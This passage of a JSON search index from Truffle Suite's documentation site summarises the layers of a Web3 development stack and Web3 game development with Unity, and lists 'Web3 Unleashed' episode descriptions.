access, Web3 applications rely on open, decentralized, and permissionless state machines for data storage, where anyone with the requisite skills and enough curiosity can access data. Blockchain technologies primarily power this layer and Ethereum is at the forefront with the majority of Web3 developers choosing to build their dapps there. Ethereum has a virtual environment known as the Ethereum Virtual Machine or EVM that stores user data (like accounts and accounts balance) and computes the next state of the network. This virtual environment is also responsible for storing and executing smart contract code mostly written in the Solidity and Viper programming languages. Due to the popularity of the EVM and the Ethereum blockchain, we've seen the emergence of other blockchains, sidechains, and Layer 2 solutions fully compatible with the EVM, allowing applications built on Ethereum to run on these platforms without needing any modification. Examples of these platforms are: The Arbitrium layer two solution The Optimism layer two solution The Polygon sidechain The Avalanche blockchain The Fantom blockchain There are other blockchains that operate differently from Ethereum and are not EVM-compatible but are home to decentralized applications too like Solana , NEAR, Avalanche, and others Although to build dapps on Solana and NEAR, you must understand the Rust programming language.", "title": "The data layer"}, {"location": "guides/web3-development-stack/#file-storage-layer", "text": "Since users' data storage happens on decentralized blockchains, it makes sense that files like images, videos, HTML, and CSS files are also stored in decentralized networks so no one organization has full access and control over them. Unfortunately, storing data like the ones mentioned above on blockchains like Ethereum (and other EVM compatible ones) or Solana can be costly. When choosing a data storage mechanism for a dapps, one has to consider the following: Persistence mechanism and incentive structure Data retention enforcement Decentrality Consensus Fortunately, there are several options to choose from like Arweave who offer permanent file storage by incentivizing node operators and miners who in turn maintain storage of these files for extended periods. Contract-based platforms like Filecoin and Skynet do not store files forever but instead, keep files for a period specified by a contract. InterPlanetary File System or IPFS , another distributed system for storing and accessing files, doesn't have any built-in incentive mechanism for miners but can be used together with other contract-based solutions.", "title": "File storage Layer"}, {"location": "guides/web3-development-stack/#apidata-access-layer", "text": "Another essential layer of the Web3 stack is the API or Data access layer. This comprises platforms that enable easy access to data that lives on the blockchain and files on distributed file storage networks. Due to the current state of popular blockchain networks like Ethereum, running a self-hosted node to access blockchain data can be time-consuming. Therefore, maintaining these nodes does not contribute directly to productive hours, especially during development. This is why platforms like Infura exist. Infura exposes a set of APIs that allow Web3 developers to connect their dapps to the Ethereum network with zero stress, letting them focus on building out application features rather than maintaining nodes. It also provides an API for connecting to IPFS for distributed files storage and retrieval. Alchemy is another example of API platforms supporting popular blockchains like Ethereum, Flow, and Polygon. Quicknode , on the other hand, provides Dapps developers with access to blockchain data via APIs and dedicated node instances.", "title": "API/Data Access Layer"}, {"location": "guides/web3-development-stack/#presentation-layer", "text": "The presentation layer for a dapp is not too different from that of a Web2 app. We use the same set of libraries to create user interfaces. For example, due to its popularity and thriving ecosystem, the React.js library remains the preferred choice for building out the frontend of Web3 applications. Other libraries such as JQuery, Angular and VueJS can also be used. The major difference between the Web3. frontend stack and that of Web2. is how we fetch data from external APIs. By comparison, a typical Web2 application uses HTTP libraries like Axios and Fetch to query API endpoints or clients like Apollo for GraphQL endpoints; in Web3, we use libraries like Ether.js or Web3.js to make Remote Procedure Calls (RPC) to blockchain nodes.", "title": "Presentation Layer"}, {"location": "guides/web3-development-stack/#identity-layer", "text": "Unlike in Web2, where internet users are identified by their unique username/email and password, Web3 implements an entirely different strategy for identity management powered by blockchain wallet like MetaMask . In Web3, the typical user experience involves connecting your wallet to a dapp you want to use and granting this wallet the power to sign transactions on your behalf. There are two popular ways to connect a wallet to a dapp: By accessing the provider object exposed by these wallets on the browser window. This primarily applies to wallets in the form of browser extensions. By scanning a barcode exposed by the dapp using tools like WalletConnect (for Ethereum). Wallets in the form of mobile applications mostly use this method. Libraries like Web3Modal and Web3React exists to help developers connect to multiple wallet providers with the same code.", "title": "Identity Layer"}, {"location": "guides/web3-development-stack/#conclusion", "text": "Web3 enforces the concept of decentralization by replacing centralized technologies with blockchains and protocols. It also introduces a new way of giving users ownership of their data and identity through private-key cryptography. What will define Web3 moving forward is the ease at which dapps can be built. This is why defining the stack is critical. At Truffle we aim to be the number one choice for development.", "title": "Conclusion"}, {"location": "guides/web3-gaming-development-with-truffle-and-unity/", "text": "We're so excited you're taking your first steps into developing web3 games with Unity and the Truffle Suite. There are only a few tools you need to get started: Unity : To create the game itself, we're going to need a game engine. There are many out there, but for full-length 3D games the 2 main engines are Unity and Unreal Engine. We'll be using Unity here since it's easier to pick up and supports C#, which already has an Ethereum library, NEthereum. Truffle CLI : Truffle CLI manages the lifecycle of our smart contracts. It handles compiling our Solidity and producing artifact files, JSON files which contain the function signatures for a given contract (among other things). We'll ingest these artifacts using the MetaMask SDK and NEtherem so we can interact with our smart contracts. NEthereum : NEthereum allows us to interact with the Ethereum blockchain more conveniently than making raw RPC calls. NEthereum, combined with the MetaMask SDK, will let our users interact with the smart contracts powering our game. Consensys has a number of tools in the Unity asset store that will help you create any web3 gaming experience you can imagine. Another one you may want to check out is the Infura Unity SDK . This allows you to quickly work with NFTs; querying collections, minting new NFTs, transferring them and more, without doing any smart contract development! If you want to see a full walkthrough of building a Tic Tac Toe game, see our Truffle x Unity tutorial ! Guides \u00b6 With the above tools installed, check out these guides that will help you get familiar with NFT development, a very popular crypto primitive to combine with games. NFT could host things like skins, game assets, or a player's inventory for later trading or other functionality on-chain. Build a NFT Rental Marketplace Part 1 & Part 2 Write a rentable NFT smart contract Write an NFT Smart Contract with Royalties How to Build a NFT Marketplace DApp on Ethereum or Optimism Want updates on the newest web3 gaming tools and techniques? Join our Early Adopter Program to work with our team and community to learn more about web3 gaming and design the best features to bring your game to the next!", "title": "Web3 Gaming Development with Truffle and Unity"}, {"location": "guides/web3-gaming-development-with-truffle-and-unity/#guides", "text": "With the above tools installed, check out these guides that will help you get familiar with NFT development, a very popular crypto primitive to combine with games. NFT could host things like skins, game assets, or a player's inventory for later trading or other functionality on-chain. Build a NFT Rental Marketplace Part 1 & Part 2 Write a rentable NFT smart contract Write an NFT Smart Contract with Royalties How to Build a NFT Marketplace DApp on Ethereum or Optimism Want updates on the newest web3 gaming tools and techniques? Join our Early Adopter Program to work with our team and community to learn more about web3 gaming and design the best features to bring your game to the next!", "title": "Guides"}, {"location": "policy/", "text": "", "title": "Truffle Policy"}, {"location": "staff/", "text": "", "title": "Truffle Staff"}, {"location": "truffle/", "text": "", "title": "Truffle"}, {"location": "trufflecon2020/", "text": "", "title": "TruffleCon 2020"}, {"location": "tutorial/", "text": "Redirecting to /guides/pet-shop", "title": "Index"}, {"location": "tutorial/pet-shop/", "text": "Redirecting to /guides/pet-shop", "title": "Index"}, {"location": "tutorials/", "text": "Redirecting to /guides/pet-shop", "title": "Index"}, {"location": "tutorials/pet-shop/", "text": "Redirecting to /guides/pet-shop", "title": "Index"}, {"location": "unleashed/", "text": ".md-content__button { display: none; } Web3 Unleashed Episode #1 - Write an NFT Smart Contract with Royalties 8/5/2022 Emily Lin In this chapter of Web3 Unleashed, we're going to briefly go over what an Ethereum Improvement Proposal (EIP) and an Ethereum Request for Comment (ERC) is, how they are used, and implement the ERC-2981, NFT royalty standard, as an example. DISCOVER MORE Episode #2 - Write a Rentable NFT Smart Contract 8/12/2022 Emily Lin In this guide, we'll be covering what the ERC-4907 rentable NFT standard is and how we can implement one using Truffle! DISCOVER MORE Episode #3 - Should you upgrade your smart contract and how (ft. OpenZeppelin) 08/19/2022 9:00AM PDT Emily Lin In this episode of Web3 Unleashed, we'll be chatting with OpenZeppelin about security tradeoffs when uploading smart contracts DISCOVER MORE Episode #4 - Build a NFT Rental Marketplace Part 1 09/08/2022 9:00AM PDT Emily Lin In this episode of Web3 Unleashed, we'll be building a rental marketplace smart contract DISCOVER MORE Episode #5 - Automate your Smart Contract 09/15/2022 4:00 CET Emily Lin In this episode of Web3 Unleashed, we'll join Hilmar Orth, co-founder of Gelato Network, to talk about the future of smart contract automation and how to do it! DISCOVER MORE Episode #6 - What is Decentralized Streaming 09/22/2022 9:00 PST Emily Lin In this episode of Web3 Unleashed, we'll join Yondon Fu, co-founder of Livepeer, to talk about how decentralized livestreaming is changing the way we interact with communication and entertainment! DISCOVER MORE Episode #7 - Build a dapp with Next.js and the MetaMask API 10/12/2022 9:00 PST Eric Bishard In this episode of Web3 Unleashed, we talk with Eric Bishard and Guillaume Bibeau-Laviolette about the MetaMask API and how to build with it! DISCOVER MORE Episode #8 - Optimistic rollups and bridging with Optimism 11/03/2022 8:00 PST Emily Lin In this episode of Web3 Unleashed, we'll join Annie from Optimism to talk about the L2 ecosystem - what it is and how Optimism is planning for the future. At the end, we'll be covering how to incorporate bridging into your Optimism dapp! DISCOVER MORE Episode #9 - Build a NFT Rental Marketplace Part 2 11/10/2022 9:00 PST Emily Lin We'll be building the last piece of our NFT Rental Marketplace: the frontend! This marketplace will leverage Infura's NFT API and IPFS gateways to mint and display NFTs! DISCOVER MORE Episode #10 - How to build a MetaMask snap 12/15/2022 9:00 PST Emily Lin In this episode, we'll be joined by Christian Montoya and Guillaume Roux to talk about extending the functionality of your MetaMask wallet using MetaMask Snaps! DISCOVER MORE Episode #11 - How to Add Notifications to Your Dapp 1/05/2023 9:00 PST Emily Lin In this episode, we'll be joined by core developer Fabio to learn about and build with Push Protocol! DISCOVER MORE Episode #12 - Decentralized social media with Lens 1/26/2023 9:00 PST Emily Lin Learn from Nader Dabit about how decentralized social media is onboarding the next million users into Web3 and how to get started building with Lens! DISCOVER MORE", "title": "Web3 Unleashed"}]}